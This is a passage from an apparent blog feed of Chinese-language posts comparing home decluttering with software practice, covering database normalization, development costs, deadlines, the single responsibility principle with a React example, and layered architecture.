        <content type="html"><![CDATA[<p>不知道大家有沒有過這樣的經驗，每次參加求活動拿到很多造型很醜的贈品，明明沒花錢買但又覺得丟掉或送人都怪怪的，沒花錢卻出現浪費跟可惜的感覺，久而久之房間就堆放許多雞肋但沒有用到的物品。</p><p>當物品被堆疊後就很容易被遺忘，當需要時又需要翻箱倒櫃去找，這就跟丟垃圾桶沒什麼區別。</p><blockquote><p>你是否問過自己擁有什麼?<br>為了要擁有那些付出什麼?<br>追逐的人生換來那些什麼?<br>最後能帶走什麼？<br>五月天 What A Song</p></blockquote><p>物品在經過選擇後而沒有辦法馬上拋棄的話，收納就會是重要的，收納能夠讓我們輕鬆地找到需要的東西，而不必花時間一層一層地尋找或者堆疊物品，接下來就讓我們從資料儲存的角度切入來看看收納的概念。</p><h2 id="正規化"><a href="#正規化" class="headerlink" title="正規化"></a>正規化</h2><p>正規化（Normalization）要求將資料分散到不同的表格中，目的是確保資料的一致性、減少重複性，目標在提高資料管理的效率，但可能會導致複雜的查詢。</p><p>資料庫的過度正規化就像是極致的收納，然而極致收納可能導致在使用介面（UI）時變得不方便，因為 UI 通常需要將資料全部展示出來，這代表可能需要不斷地把櫃子的東西倒出來排好然後又把東西一層一層塞回去容量有限的抽屜關起來。</p><p>但欄位的原子化仍舊相當的重要，也就是讓欄位的值不能進一步分解，這有助於確保資料的單一性和結構的簡單性。</p><p>例如如果有一個名稱欄位，不應該包含姓名、姓氏，而應該將它們分開儲存。</p><table><thead><tr><th>姓名</th><th>課程</th></tr></thead><tbody><tr><td>小明</td><td>“數學，物理(二)，化學(一)”</td></tr><tr><td>小華</td><td>“英文，物理(一)，化學(二)”</td></tr></tbody></table><p>姓名: “小明，小華”<br>課程: “數學，物理(二)，化學(一)”</p><p>正規化會把課程內容再原子化分為兩個欄位<br>課程名稱: “數學，物理，化學”<br>課程代號: “一，二”</p><p>如果現在要找出所有化學課:</p><p>有符合原子化的 query: <code>select * from 課程列表 where course_name = &#39;物理&#39;</code><br>沒符合原子化的 query: <code>select * from 課程列表 where course like &#39;化學%&#39;</code></p><p>以上面的例子來說，原子化後可以看出效能的差異，但正規化再繼續做下去，多對多的關係再拆分就會需要更多資料表，當資料筆數變更多查詢的效能就會越差。</p><h2 id="反正規化"><a href="#反正規化" class="headerlink" title="反正規化"></a>反正規化</h2><p>反正規化 (Denormalization) 可以將相關資料合併到一個表中，以減少查詢的複雜性，從而提高讀取效能，但可能會增加資料冗余和管理複雜性。</p><p>為了效能的反正規化，雖然沒遵守 3NF 但也需要仔細的設計和規劃，該做的原子化還是建議要做，不適當的使用可能會導致效能問題或資料管理上的困難。</p><h2 id="Single-Table-Design"><a href="#Single-Table-Design" class="headerlink" title="Single Table Design"></a>Single Table Design</h2><p>是一種資料庫設計方法，它將所有不同種類的資料都存儲在一個資料表中，這種設計方法強調簡單性和可擴展性，特別適用於 NoSQL 資料庫。</p><ul><li>易於擴展: 資料無需在不同的表之間移動或轉換資料，可以輕鬆處理不斷增長的資料量</li><li>靈活性: 不要求資料具有相同的結構</li><li>簡化查詢: 單個表可簡化查詢操作，無需不同的表或進行複雜的資料處理</li><li>高效性能: 適合高度分散式的設計來達到極高的性能</li><li>簡化管理: 管理一個表比多個表更容易</li></ul><h2 id="資料收納的選擇"><a href="#資料收納的選擇" class="headerlink" title="資料收納的選擇"></a>資料收納的選擇</h2><p>在資料庫設計中需要仔細考慮應用的需求和性能要求</p><ul><li>正規化通常用於需要高度資料一致性，例如金融系統或醫療記錄</li><li>反正規化通常用於需要快速查詢和報告，例如分析或報告工具</li><li>Single Table Design 通常用於需要擴展性和簡單性的應用，例如大規模 Web 應用或物聯網設備</li></ul><p>最終的選擇應該基於實際的情況，需要權衡資料一致性、性能和管理複雜性，實作上也可以混合使用這些解決方案，以滿足不同類型的資料和查詢需求。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>會不會放手，其實才是擁有</title>
      <link href="/2023/09/27/simplify-your-life/cost-of-software-development/"/>
      <url>/2023/09/27/simplify-your-life/cost-of-software-development/</url>
      
        <content type="html"><![CDATA[<blockquote><p>幸福的回憶是追求幸福的天敵</p></blockquote><p>資本主義社會本質上是一場競爭資源的遊戲，但過度追求物質或權力的行為就像是金手銬，會使我們執著並陷入無止境的追逐。</p><p>人們往往不願意放棄那些投入許多資源但實際上沒有價值的物品，當擁有過多物品時其實並沒有更快樂，卻反而因為需要花更多時間和精力來維護而感到焦慮、壓力和混亂，想想汽車的折舊和保養，就是擁有物品所付出的代價與成本。</p><p>從狀態機的角度看，一直停在<code>追求</code>的狀態就永遠無法達到<code>滿足</code>，當我們停止執著反而更容易獲得內在的平靜和滿足感，因此放手成為一種更有智慧的選擇。</p><blockquote><p>會不會放手，其實才是擁有</p></blockquote><p>回到擁有物品所付出的代價，軟體開發上常見需要考量的成本包含</p><ul><li>流程成本: 目標是減少流程，每多一道流程就增加出錯的機率</li><li>理解成本: 目標是可讀性高的程式碼</li><li>修改成本: 目標是可維護性高的程式碼</li><li>執行成本: 目標是降低時間與空間複雜度</li><li>測試成本: 目標是增加自動化的比例，降低人工</li><li>技術成本: 目標是減少專案的入門門檻</li></ul><p>買房必須在預算和空間的考量下追求最大的舒適和便利，軟體開發同樣需要在有限的資源下完成工作，在限制之中追求最佳解，資深的工程師在軟體開發過程中則是要注意開發上的資源限制和成本控制，協助開發團隊在成本與產出之間找到平衡，確保有足夠的資源來完成專案。</p><h2 id="流程成本"><a href="#流程成本" class="headerlink" title="流程成本"></a>流程成本</h2><p>首先，每個確認清單或標準作業流程背後都隱含著一種注意力成本，光是要配合各種獨特的 SOP 就已經先花掉大半注意力。</p><p>另外在大型企業中，重要決策需要多個部門之間的協調和確認，常常附帶著隱形決策成本，因為我們難以明確了解決策的真正來源和原因，所以無法知道指揮官的意圖，最終就只能在上戰場時遇到問題又回來確認是否正確合規。</p><p>額外一提，對某些公司也需要遵守政府法規，例如資料必須符合資安規範不能放上雲端，不得不去增加額外開發的複雜性和成本，以確保資料和系統的安全性。</p><h2 id="理解成本-可讀性"><a href="#理解成本-可讀性" class="headerlink" title="理解成本 (可讀性)"></a>理解成本 (可讀性)</h2><blockquote><p>這只是要增加一點小功能，應該會很迅速完成，對吧？</p></blockquote><p>沒錯，或許只需新增一行程式碼便可解決這問題，但因為程式碼的混亂，也可能花費了許多時間來理解，這就是理解成本。</p><p>隨著專案的擴大，需要閱讀的程式碼也相應增加，每次撰寫新的程式碼，就像建構一座高塔，隨著高度增加，也就變得較不敢輕易新增程式碼。</p><p>最終，整個專案可能會面臨難以輕鬆新增功能的情況，新增新功能所需的時間變得難以估計。</p><h2 id="修改成本-可維護性"><a href="#修改成本-可維護性" class="headerlink" title="修改成本 (可維護性)"></a>修改成本 (可維護性)</h2><p>在那些需求持續變化的專案中，每當再一次配合新需求修改相同程式碼段落的成本通常都會增加。</p><p>如果能夠降低下次修改程式碼所需的時間或快速恢復到之前的版本，那麼就能有效提高生產力。</p><p>這就需要使用版本管理工具的良好習慣或採用可模組化的程式設計架構。</p><h2 id="執行成本-效能"><a href="#執行成本-效能" class="headerlink" title="執行成本 (效能)"></a>執行成本 (效能)</h2><p>隨著資料量的增加，程式不再能在啟動的瞬間立即完成，而是需要等待機器進行運算。</p><p>有時候，即使只有一小部分程式碼存在問題，程式也可能一直運行甚至可能永遠無法完成，使得程式運行的時間難以預測，在這個階段需要開始注重程式的效能，並深入研究資料結構和演算法。</p><p>程式的執行需要消耗機器的運算和儲存資源，像是處理器等級、記憶體大小、硬碟空間、網路頻寬等等，做出一個解決方但需要 100 核心的處理器，就像是 ChatGPT 解決方案如果出現在十年前其實並不實際。</p><p>資源是有限的，通過時間複雜度和空間複雜度的初步估計，就能夠更好地了解執行程式所需的時間，並比較不同演算法之間的優劣。</p><h2 id="測試成本-可測試性"><a href="#測試成本-可測試性" class="headerlink" title="測試成本 (可測試性)"></a>測試成本 (可測試性)</h2><p>隨著時間的推移，價值觀不斷變化，多種因素可能讓以前寫的程式碼變得不夠優秀。</p><p>每當幾個月後回顧程式碼，常常會有一種「這什麼糞 Code！」的感覺，於是又不得不重新撰寫，每次重新撰寫時，經常會修改先前的程式碼的一部分，每一行程式碼的更動都可能對任何功能造成不利影響，特別是在專案規模較大的情況下必須經常重新進行測試。</p><p>在這種情況下，測試的成本變得明顯，因此自動化測試變得不可或缺。</p><h2 id="技術成本"><a href="#技術成本" class="headerlink" title="技術成本"></a>技術成本</h2><p>有時候開發會受到開發團隊的規模和技術水平限制，有時可能就是只能找菜鳥，甚至是非本科系的員工，這時候就會在可用技術和工具上的有所限制，必須在現有已知的技術選型中作出選擇，而不一定是最理想的選擇。</p><p>大型、複雜的軟體系統需要更多的計劃和管理以應對複雜性，技術限制可能包括特定技術選型或平台的選擇，開發團隊需要在滿足專案需求的同時又可以快速解決技術挑戰。</p><p>如果資源有限或技術領域無法掌握，也可以考慮聘請外部專家或外包部分工作來填補差距，透過低成本的方式找到合適的解決方案，以達到更好的結果。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我願意，付出所有來換一個時光機</title>
      <link href="/2023/09/26/simplify-your-life/constraints-of-time/"/>
      <url>/2023/09/26/simplify-your-life/constraints-of-time/</url>
      
        <content type="html"><![CDATA[<blockquote><p>再一次，我就不會走向這樣的結局</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/hKPtVlSW2qA?si=eLf9cuNuYQEjnDCL" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>物品總有保存期限，時間到了就無法再使用，時間有限且一去不回的情況下，我們必須做出當下所能做出的決定。</p><p>我們在同個時間只能使用一條牙膏跟一隻牙刷，所以當下能得到的物品理論上是沒有辦法一直增加的。</p><p>在前幾篇文章中談到當同類型物件變多之後該怎麼進行<a href="https://linyencheng.github.io/2023/09/20/simplify-your-life/organization-of-objects-and-files/">分類</a>和<a href="https://linyencheng.github.io/2023/09/19/simplify-your-life/object-management-nine-knives-or-a-swiss-army-knife/">管理</a>。</p><p>當物件還是過多時，就是回到<a href="https://linyencheng.github.io/2023/09/21/simplify-your-life/choose-with-requirement/">需求面來看</a>，學會選擇才能從源頭就減少物品，該評估自己擁有的<a href="https://linyencheng.github.io/2023/09/22/simplify-your-life/code-smells/">物件到底是好或不好</a>並練習<a href="https://linyencheng.github.io/2023/09/23/simplify-your-life/desires-and-ecessities-the-wisdom-of-choices-in-coding/">選擇開源的套件</a>。</p><p>如果想等到事情全部做完才叫成功，那大概永遠不會成功，我們總是會需要在還沒準備好的時候就做出當下最好的決定。</p><h2 id="時間限制"><a href="#時間限制" class="headerlink" title="時間限制"></a>時間限制</h2><p>在軟體開發領域，有些事情就是注定要花那麼久的時間。</p><blockquote><p>一名女性可以九個月懷胎生下一個小孩，但一次找到九個女性，她們也無法在一個月內生出一個小孩<br>人月神話</p></blockquote><p>人生有限，決定是不是要跟另外一半結婚生小孩就需要在有限的時間內思考，需要在某個時間點之前就做決定。</p><p>時間限制是軟體開發中最常見的限制</p><ul><li>專案交付日期: 老闆說我就要</li><li>市場競爭: 30 年後才完成的無名小站，還有人要使用嗎</li><li>法定期限: 2020 全台最大線上遊戲盤中零股上線啦</li><li>市場機會: 疫情當下就是需要的口罩地圖</li><li>突發事件: 個資外洩中，帳戶資料堪憂</li><li>資金限制: 半年內需要達到損益兩平不然就要回家吃自己</li><li>年度目標: 每年打考績的遊戲又要開始啦</li><li>行業趨勢: 預計 2018 完成 7nm 量產</li></ul><p>不管是什麼樣的原因，開發者必須在預定的時間內完成項目，就像是生活中擔心可能會因為年紀到了生不出小孩，也可能是擔心當你 40 歲的時候小孩還在念幼稚園，會出現照顧上的無力。</p><p>漸漸的開發方式就演變成常見的隕石式開發或是敏(加)捷(班)式開發。</p><h2 id="隕石式開發-Meteor-Development"><a href="#隕石式開發-Meteor-Development" class="headerlink" title="隕石式開發 (Meteor Development)"></a>隕石式開發 (Meteor Development)</h2><p>隕石式開發是一種大家常見的軟體開發方法，原則上是強調老闆的重要性。</p><p>這種方法的名稱暗示了像隕石一樣快速撞擊目標，然後再迅速調整方向。</p><blockquote><p>隕石式開發的特點：客戶或老闆在開發過程中提出新的需求或更改需求</p></blockquote><p>開發的過程中我們仍舊會需要大量的測試，不過能做的就是盡可能利用現有的函式庫、框架來減少開發時間，行有餘力的話就導入自動化的測試來減少人為的疏忽和節省後期修復問題的時間。</p><h2 id="敏捷式開發-Agile-Development"><a href="#敏捷式開發-Agile-Development" class="headerlink" title="敏捷式開發 (Agile Development)"></a>敏捷式開發 (Agile Development)</h2><p>如 Scrum 或 Kanban 大多強調持續交付和迭代開發，並在開發的過程中調整和優化，過程中需要有效的時間管理、不斷的定期檢討優化開發流程，透過短週期的改進來減少浪費，並透過定期的里程碑的制定來確保專案按時完成。</p><p>總之，軟體開發中的限制和期限是常態，但可以通過有效的計劃、管理和技術選擇來克服，通過調整任務優先順序、自動化測試等等方式，團隊可以練習在有限的時間和資源內提高生產力並交付高品質的軟體。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次做一件事，念</title>
      <link href="/2023/09/25/simplify-your-life/single-responsibility-principle/"/>
      <url>/2023/09/25/simplify-your-life/single-responsibility-principle/</url>
      
        <content type="html"><![CDATA[<p>物品我們都知道要按照其功能或用途分類和整理，來確保每個物品都處於適當的位置，整理後的物品更容易被找到，因為被分類得很清楚。</p><p>在架構上，該怎麼去做設計和切分，才能讓下面一位接手的人心情不至於太差呢?</p><p>回顧一下之前的例子，專案假設今天總共用五個階段五個角色，每個角色在不同階段需要填的欄位並不相同，可以想像一個班級有不同的幹部，而班級學期報告需要大家按照各自的職掌在不同階段逐漸把內容完善。</p><blockquote><p>程式會被修改的原因，通常是使用者需求的改變</p></blockquote><p>假設一個類別只做一件事，但這件事剛好被兩個角色使用到，當其中一個角色提出新的需求，調整時就影響到另外一個，這就是把元件做成瑞士刀給不同角色去使用的壞處。</p><p>這時候該怎麼做比較好，接著就讓我們來看看 Single Responsibility Principle (SRP) 的概念吧。</p><h2 id="Single-Responsibility-Principle-SRP"><a href="#Single-Responsibility-Principle-SRP" class="headerlink" title="Single Responsibility Principle (SRP)"></a>Single Responsibility Principle (SRP)</h2><p>Single Responsibility Principle (SRP) 是指每個類別或模組只負責一個功能或職責。</p><blockquote><p>一個類別或模組應該只有一個理由會使其改變</p></blockquote><p>這個說明應該更往回推，因為程式會被修改的原因，通常是使用者需求的改變。</p><blockquote><p>一個類別或模組應該只對唯一的一個角色負責</p></blockquote><p>單一職責原則，是希望我們依據不同角色的使用者來進行分類，只有當這個特定群體的需求改變，程式碼才會改變。</p><p>讓我們看看前後端的例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frontend</span></span><br><span class="line">src</span><br><span class="line">└── features</span><br><span class="line">    ├── typeOne</span><br><span class="line">    │   ├── TypeOne.js</span><br><span class="line">    │   ├── TypeOne.styles.scss</span><br><span class="line">    │   └── typeOneSlice.js</span><br><span class="line">    ├── typeTwo</span><br><span class="line">    │   ├── TypeTwo.js</span><br><span class="line">    │   ├── TypeTwo.styles.scss</span><br><span class="line">    │   └── typeTwoSlice.js</span><br><span class="line">    └── typeThree</span><br><span class="line">        ├── TypeThree.js</span><br><span class="line">        ├── TypeThree.styles.scss</span><br><span class="line">        └── typeThreeSlice.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># backend</span></span><br><span class="line">src/</span><br><span class="line">  ├── entities/                <span class="comment"># 按照資料表去區分</span></span><br><span class="line">  │  └── user/                 <span class="comment"># 使用者表</span></span><br><span class="line">  │     ├── model.js           <span class="comment"># Schema 定義</span></span><br><span class="line">  │     ├── controller.js      <span class="comment"># 資料庫 CRUD</span></span><br><span class="line">  │     └── route.js           <span class="comment"># API 設定</span></span><br><span class="line">  └── index.js                 <span class="comment"># 入口</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>這樣的程式碼會更容易理解，因為</p><ul><li>功能是清晰和有界線，減少相互依賴和複雜性</li><li>變更只會影響到相關的功能不會影響其他部分，使得修改和維護更容易</li></ul><p>這樣的作法雖然會導致程式碼重複，但因為模組會針對不同群的使用者分開，複製貼上的成本比起每次更動都可能影響一大群使用者來說，其代價會是相對小的。</p><p>這讓我想起了大學時期曾經到恆春夏日小學當課輔老師，當時社工老師希望我們和孩子傳遞的價值觀</p><blockquote><p>一次做一件事，念</p></blockquote><p>單一功能原則的目的是減少同個區塊中不相關的邏輯。</p><p>當被開發者找到程式碼後，可以更快確認在哪一行產生目前的行為，更容易去判斷在這一階層 (頁面) 的操作只要正確就可以不用煩惱其他階層的任何操作，進而更容易且安全的去修改程式碼。</p><p>以撥放器的 App 來說，撥放的頁面和設定的頁面是分開的，設定的時候並不用管撥放的時候做了什麼操作，對程式碼來說開發者就要知道這段程式碼是在做什麼，有沒有耦合或是在不明顯的地方又多做其他的事情，以 React 的開發來說比較好的方式就是將顯示邏輯和資料邏輯分開。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="comment">// 資料和顯示寫在一起</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SendButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [data, setData] = <span class="title function_">useState</span>(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">const</span> strButtonDisplay = <span class="string">&quot;送出&quot;</span>;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="string">&quot;http://example.com/movies.json&quot;</span>;</span><br><span class="line">  <span class="comment">// 送出的邏輯</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">handleSend</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(url)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">myJson</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setData</span>(myJson);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;handleSend&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;strButtonDisplay&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 將資料和顯示邏輯分開</span></span><br><span class="line"><span class="comment">// 資料邏輯</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useSubmit</span>(<span class="params">&#123; strButtonDisplay, url &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [data, setData] = <span class="title function_">useState</span>(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">onClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 送出的邏輯</span></span><br><span class="line">    <span class="title function_">fetch</span>(url)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">myJson</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setData</span>(myJson);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    strButtonDisplay,</span><br><span class="line">    data,</span><br><span class="line">    onClick,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示邏輯</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ThemeButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; strButtonDisplay, data, onClick &#125; = <span class="title function_">useSubmit</span>(&#123;</span><br><span class="line">    <span class="attr">strButtonDisplay</span>: <span class="string">&quot;送出&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://example.com/movies.json&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;onClick&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;strButtonDisplay&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="康威定律"><a href="#康威定律" class="headerlink" title="康威定律"></a>康威定律</h3><blockquote><p>設計系統的架構受制於產生這些設計的組織的溝通結構。<br>M. Conway</p></blockquote><p>系統設計本質上其實反映了企業的組織結構，軟體的架構與團隊的組織結構是互相影響的。</p><p>系統各個模組間的介面也反應了企業各個部門之間的訊息流動和合作方式，如果組織在資源和合作上沒有真的共用某些資源，那麼在程式設計上我們就不應該共用模組。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>架構與分層 X 整理的秘訣</title>
      <link href="/2023/09/24/simplify-your-life/layered-application/"/>
      <url>/2023/09/24/simplify-your-life/layered-application/</url>
      
        <content type="html"><![CDATA[<p>當我們買了一堆櫃子或收納盒，那最後東西到底該被收到哪邊?</p><p>在居住空間中，樓層會有地下室、一樓、二樓等不同層並具有不同功能，地下室或一樓可以用來停車，二樓以上較常用來作為日常使用的空間。在軟體中也可以將架構劃分為多層，例如資料層、業務邏輯層和展示層，每一層分別負責不同的功能。</p><p>收納通常有基本原則，使用合適容器、抽屜或櫃子將相似物品放一起來隔離和保護特定物品，收納的關鍵目標是確保物品有組織地存放，以便容易找到和使用。同樣軟體架構分層也有基本原則，例如將功能相關放在同一層，不同層次的隔離和保護有助於減少錯誤擴散，並確保低耦合和高內聚並將功能模組化，使其易於開發、測試和維護。</p><p>在進行軟體開發時，最重要的事情是軟體會需要持續維護、發展、接收新功能、改進和修復錯誤，不同於房屋的買賣，程式會隨著時間過去和開發人員流動，讓維護比建立具有相同功能的全新軟體更困難。</p><h2 id="三層式架構"><a href="#三層式架構" class="headerlink" title="三層式架構"></a>三層式架構</h2><p>程式的架構有點像蓋房子，主要分法可以分成三層資料層 (Data Layer)、業務邏輯層 (Domain Layer)、展現層 (Presentation Layer)</p><ul><li>資料層 (Data Layer): 就像是底層跟房屋架構，確認後的變動最少</li><li>業務邏輯層 (Domain Layer): 房子本身的格局設計，可稍微變動但變動也不多</li><li>展現層 (Presentation Layer): 房子外觀裝飾或頂部加蓋，最多變動和彈性</li></ul><h3 id="資料層-Data-Layer"><a href="#資料層-Data-Layer" class="headerlink" title="資料層 (Data Layer)"></a>資料層 (Data Layer)</h3><p>資料層負責資料的儲存、檢索和管理，並提供對資料的基本操作，它包括資料庫、文件系統、外部 API 或其他資料來源。</p><p>這一層關注資料的完整性、安全性和持久性，通常使用資料庫管理系統 (如 MySQL、PostgreSQL、MongoDB 等) 來儲存資料，提供了資料操作的基本 CRUD(創建、讀取、更新、刪除)操作。</p><p>資料層通常透過業務邏輯層來操作，以進行檢索和儲存資料。</p><h3 id="業務邏輯層-Domain-Layer"><a href="#業務邏輯層-Domain-Layer" class="headerlink" title="業務邏輯層 (Domain Layer)"></a>業務邏輯層 (Domain Layer)</h3><p>業務邏輯層是程式的核心，負責管理程式的核心業務邏輯、流程控制。</p><p>業務邏輯層位於資料層和展現層之間，可以包含許多不同的模組和服務，以實現程式的具體功能，確保資料在不同層級之間的正確傳遞和處理。</p><p>業務邏輯層通常訪問資料層以檢索和更新資料，同時提供程式界面 (API) 供展現層使用。</p><h3 id="展現層-Presentation-Layer"><a href="#展現層-Presentation-Layer" class="headerlink" title="展現層 (Presentation Layer)"></a>展現層 (Presentation Layer)</h3><p>展現層通常是最終用戶與程式互動的界面，負責將資料和程式功能呈現給最終用戶，包括用戶界面 (UI)、網頁、App 等，這一層關注用戶體驗、界面設計和互動。</p><p>展現層負責將業務邏輯提供的資料呈現給用戶，並可以接收用戶的輸入並將其傳遞給業務邏輯層，同時顯示從業務邏輯層獲取的資料。</p><h2 id="可維護的程式碼"><a href="#可維護的程式碼" class="headerlink" title="可維護的程式碼"></a>可維護的程式碼</h2><p>任何熟悉該領域的開發人員都應該能夠</p><ul><li>對功能進行優化和問題修復，並不破壞底層的東西</li><li>快速理解程式碼並知道在哪裡進行更改</li></ul><p>目標是當程式在做修改的時候，業務邏輯應該要能夠穩定的被持續測試</p><ul><li>修改展現層不應破壞任何業務邏輯</li><li>修改資料庫不應影響軟體的業務規則</li></ul><p>回到<a href="https://linyencheng.github.io/2023/09/23/simplify-your-life/desires-and-ecessities-the-wisdom-of-choices-in-coding/">怎麼選擇套件的問題</a>，在程式撰寫上我們要要注意新撰寫的程式對架構的影響</p><ul><li>穿透性: 原則上不是穿透原本程式架構的設計，像 Redux 就屬於可以穿透在每個角落的一個套件，以 Redux 來說就像是硬裝潢，裝下去之後做更動的成本就非常高</li><li>影響範圍: 是否容易被替代，跟原本的做法會不會差很多，是否需要重寫，像一般的表格換成 Aggrid 就相當於重寫</li></ul><p>以剛剛的三層式架構來說，也有人把三層變體成一圈一圈的洋蔥式架構，並針對功能分層製作，每一層都有自己的焦點，該架構的黃金法則是：</p><blockquote><p>內圈中任何事物都無法了解外圈中的任何事物。其中包括函數、類別、變數或任何其他命名的軟體實體。<br>Robert Cecil Martin</p></blockquote><p>那該怎麼寫出好的架構呢? 下一篇文章小編會繼續帶大家看下去。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>想要與需要，選擇的智慧</title>
      <link href="/2023/09/23/simplify-your-life/desires-and-ecessities-the-wisdom-of-choices-in-coding/"/>
      <url>/2023/09/23/simplify-your-life/desires-and-ecessities-the-wisdom-of-choices-in-coding/</url>
      
